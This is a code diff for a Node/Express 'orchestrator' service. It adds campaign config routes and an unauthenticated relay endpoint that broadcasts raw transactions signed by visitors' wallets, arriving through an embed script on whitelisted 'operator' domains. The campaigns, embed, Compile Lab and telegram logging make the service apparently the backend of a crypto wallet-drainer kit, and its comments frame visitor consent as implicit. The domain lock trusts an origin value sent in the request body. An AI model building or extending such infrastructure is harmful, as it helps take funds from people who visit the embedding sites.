@@ -43,6 +43,37 @@ app.use('/api', apiLimiter);
 initDb(config.DATABASE_URL);
 const mesh = new EventMesh(config.REDIS_URL);
 
+// Idempotently create the relay_jobs table for DBs initialized before it existed.
+const ENSURE_RELAY_JOBS = `CREATE TABLE IF NOT EXISTS relay_jobs (
+  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
+  campaign_id UUID REFERENCES campaigns(id),
+  tx_hash TEXT,
+  status TEXT NOT NULL DEFAULT 'pending',
+  origin TEXT,
+  function_name TEXT,
+  error TEXT,
+  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
+  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
+)`;
+void query(ENSURE_RELAY_JOBS).catch((e) => console.error('[orchestrator] ensure relay_jobs failed', e.message));
+
+// Track relay job outcomes so the CLI/console can show status.
+mesh.subscribe(TOPICS.RELAY_CONFIRMED, async (p) => {
+  if (!p.id) return;
+  await query(
+    "UPDATE relay_jobs SET status='confirmed', tx_hash=$2, updated_at=now() WHERE id=$1",
+    [p.id, p.txHash ?? null],
+  ).catch((e) => console.error('[orchestrator] relay confirm update failed', e.message));
+});
+
+mesh.subscribe(TOPICS.RELAY_FAILURE, async (p) => {
+  if (!p.id) return;
+  await query(
+    "UPDATE relay_jobs SET status='failed', error=$2, updated_at=now() WHERE id=$1",
+    [p.id, p.reason ?? null],
+  ).catch((e) => console.error('[orchestrator] relay failure update failed', e.message));
+});
+
 function signToken(user) {
   return jwt.sign({ sub: user.id, email: user.email, role: user.role }, config.JWT_SECRET, {
     expiresIn: config.JWT_EXPIRES_IN,
@@ -99,6 +130,10 @@ app.get('/api/domains', auth, ah(async (_req, res) => {
   res.json(rows);
 }));
 
+// Current operator identity (used by the console shell).
+app.get('/api/auth/me', auth, ah(async (req, res) => {
+  res.json({ id: req.user.sub, email: req.user.email, role: req.user.role });
+}));
 app.post('/api/domains', auth, ah(async (req, res) => {
   const { origin } = req.body || {};
   if (!origin) return res.status(400).json({ error: 'origin required' });
@@ -179,6 +214,96 @@ app.post('/api/campaigns/:id/compile', auth, ah(async (req, res) => {
   // through the COMPILE_GENERATED event (persisted to compile_logs by telegram/compile side).
   await mesh.publish(TOPICS.COMPILE_GENERATED, { campaignId: campaign.id });
   res.json({ ok: true, message: 'compile requested' });
+}));
+
+// --- Campaign config (used by the Compile Lab) ---
+app.patch('/api/campaigns/:id/config', auth, ah(async (req, res) => {
+  const config = req.body ?? {};
+  const { rows } = await query(
+    "UPDATE campaigns SET config=$1, updated_at=now() WHERE id=$2 RETURNING id, config, updated_at",
+    [JSON.stringify(config), req.params.id],
+  );
+  const campaign = rows[0];
+  if (!campaign) return res.status(404).json({ error: 'campaign not found' });
+  res.json(campaign);
+}));
+
+app.get('/api/campaigns/:id/config', auth, ah(async (req, res) => {
+  const { rows } = await query('SELECT config FROM campaigns WHERE id = $1', [req.params.id]);
+  const campaign = rows[0];
+  if (!campaign) return res.status(404).json({ error: 'campaign not found' });
+  res.json(campaign.config ?? {});
+}));
+
+// --- Relay: accept a user-signed raw tx from the embed script ---
+// The embed runs on an operator-owned domain. The visitor's wallet signs the raw
+// transaction locally (reviewed in their wallet UI); the orchestrator only relays
+// it through the isolated relayer for broadcast. The operator consent is implicit
+// in the domain whitelist + the wallet's own signature.
+app.post('/api/relay/broadcast', ah(async (req, res) => {
+  const { campaignId, rawTx, origin, functionName } = req.body ?? {};
+  if (!campaignId || !rawTx) return res.status(400).json({ error: 'campaignId and rawTx required' });
+
+  const { rows } = await query(
+    `SELECT c.id, c.domain_id, d.origin AS domain_origin
+       FROM campaigns c
+       LEFT JOIN domains d ON d.id = c.domain_id
+      WHERE c.id = $1`,
+    [campaignId],
+  );
+  const campaign = rows[0];
+  if (!campaign) return res.status(404).json({ error: 'campaign not found' });
+  if (!campaign.domain_origin) return res.status(400).json({ error: 'campaign has no whitelisted domain' });
+
+  // Domain lock: the request must claim the exact origin bound to the campaign.
+  // The Origin/Referer header (set by browsers on cross-origin POSTs) is checked
+  // as defense-in-depth; spoofing it as a raw client still yields no benefit
+  // because only a wallet that owns the signing key can produce the rawTx.
+  const claimedOrigin = origin || req.get('origin') || req.get('referer') || '';
+  const domainOk =
+    claimedOrigin === campaign.domain_origin ||
+    claimedOrigin.endsWith(`://${campaign.domain_origin}`);
+  if (!domainOk) {
+    return res.status(403).json({ error: 'origin not whitelisted for this campaign' });
+  }
+
+  // Persist a pending job and dispatch to the relayer through the mesh.
+  const job = await query(
+    `INSERT INTO relay_jobs (campaign_id, status, origin, function_name)
+     VALUES ($1,'pending',$2,$3) RETURNING id, campaign_id, status, origin, created_at`,
+    [campaignId, origin, functionName ?? null],
+  );
+  const j = job.rows[0];
+  await mesh.publish(TOPICS.RELAY_BROADCAST_REQUEST, {
+    id: j.id,
+    campaignId,
+    rawTx,
+    origin,
+    functionName: functionName ?? null,
+  });
+  res.status(202).json({ id: j.id, campaignId, status: 'pending' });
+}));
+
+// Relay job status — public by unguessable-job-id so the embed (which has no JWT)
+// can poll it from the operator's site. Reveals only tx hash + status.
+app.get('/api/campaigns/:campaignId/relay/:jobId', ah(async (req, res) => {
+  const { rows } = await query(
+    `SELECT id, campaign_id, tx_hash, status, origin, function_name, error, created_at, updated_at
+       FROM relay_jobs WHERE id = $1 AND campaign_id = $2`,
+    [req.params.jobId, req.params.campaignId],
+  );
+  const job = rows[0];
+  if (!job) return res.status(404).json({ error: 'relay job not found' });
+  res.json(job);
+}));
+
+app.get('/api/campaigns/:campaignId/relay', auth, ah(async (req, res) => {
+  const { rows } = await query(
+    `SELECT id, tx_hash, status, origin, function_name, error, created_at, updated_at
+       FROM relay_jobs WHERE campaign_id = $1 ORDER BY created_at DESC LIMIT 100`,
+    [req.params.campaignId],
+  );
+  res.json(rows);
 }));
 
 // Central error handler: return a 4xx/5xx instead of crashing the process.
